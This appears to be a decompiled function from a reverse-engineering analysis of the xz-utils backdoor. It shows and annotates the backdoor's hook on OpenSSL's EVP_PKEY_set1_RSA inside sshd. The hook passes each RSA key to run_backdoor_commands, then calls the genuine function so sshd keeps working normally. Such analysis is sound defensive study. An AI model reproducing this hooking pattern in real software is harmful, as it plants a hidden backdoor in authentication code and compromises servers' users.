// /home/kali/xzre-ghidra/xzregh/10A2D0_hook_EVP_PKEY_set1_RSA.c
// Function: hook_EVP_PKEY_set1_RSA @ 0x10A2D0
// Calling convention: __stdcall
// Prototype: int __stdcall hook_EVP_PKEY_set1_RSA(EVP_PKEY * pkey, RSA * key)


/*
 * AutoDoc: Shims EVP_PKEY_set1_RSA so the dispatcher inspects every RSA handle even if RSA_public_decrypt never fires. It validates the preserved OpenSSL pointer, hands the key to run_backdoor_commands with a stack do_orig flag, and always tail-calls the genuine EVP_PKEY_set1_RSA so sshd's key bookkeeping stays intact.
 */
#include "xzre_types.h"

int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)

{
  pfn_EVP_PKEY_set1_RSA_t orig_EVP_PKEY_set1_RSA;
  int openssl_status;
  BOOL do_orig_flag;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     // AutoDoc: Abort unless the loader recorded the original EVP entry point; without it the shim cannot re-enter OpenSSL safely.
     (orig_EVP_PKEY_set1_RSA = global_ctx->imported_funcs->EVP_PKEY_set1_RSA_orig,
     orig_EVP_PKEY_set1_RSA != (pfn_EVP_PKEY_set1_RSA_t)0x0)) {
    if (key != (RSA *)0x0) {
      // AutoDoc: Every EVP install pumps the RSA handle through run_backdoor_commands so the attacker sees keys even when decrypt never executes.
      run_backdoor_commands(key,global_ctx,&do_orig_flag);
    }
                    /* Hook tail-call: after run_backdoor_commands() it jumps through orig_EVP_PKEY_set1_RSA, so the saved pointer call only looks like a jumptable. */
    // AutoDoc: Always tail-call the preserved pointer so EVP_PKEY_set1_RSA behaves exactly like the upstream implementation.
    openssl_status = (*orig_EVP_PKEY_set1_RSA)(pkey,key);
    return openssl_status;
  }
  return 0;
}

